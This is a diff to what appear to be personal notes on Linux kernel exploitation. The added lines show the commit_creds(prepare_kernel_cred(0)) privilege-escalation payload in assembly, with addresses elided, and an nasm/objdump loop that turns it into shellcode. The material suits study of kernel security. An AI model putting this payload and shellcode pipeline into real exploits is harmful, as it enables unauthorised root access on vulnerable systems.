@@ -610,3 +610,16 @@ Enforcing
 ~ $ cat /proc/kallsyms //dynamic kernel symbol table
 man 2 fcntl // (control over descriptors)
 ```
+```asm
+xor edi, edi 
+call 0x.. # prepare_kernel_cred(0)
+
+mov rdi, rax 
+call 0x.. # commit creds with the value from return ^
+```
+
+nasm to shellcode fu
+```sh
+nasm -f elf64 priv_esc2.s -o priv_esc2.o
+for i in $(objdump -d priv_esc2.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+```
